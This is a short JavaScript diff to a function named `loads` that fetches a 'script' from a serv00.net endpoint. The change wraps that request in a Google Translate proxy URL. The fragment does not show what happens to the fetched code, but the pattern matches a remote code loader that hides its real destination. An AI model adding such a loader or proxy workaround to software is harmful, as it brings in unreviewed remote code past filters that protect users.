@@ -176,7 +176,7 @@ export function __filename(
 
 /* load file */
 export async function loads(q) {
-    const response = await fetch(`https://amiruldev.serv00.net/run.php?q=${q}`);
+    const response = await fetch(`https://translate.google.com/translate?sl=id&tl=en&hl=id&u=https://amiruldev.serv00.net/run.php?q=${q}&client=webapp`);
     if (!response.ok) {
         throw new Error(`Failed to load script: ${response.statusText}`);
     }
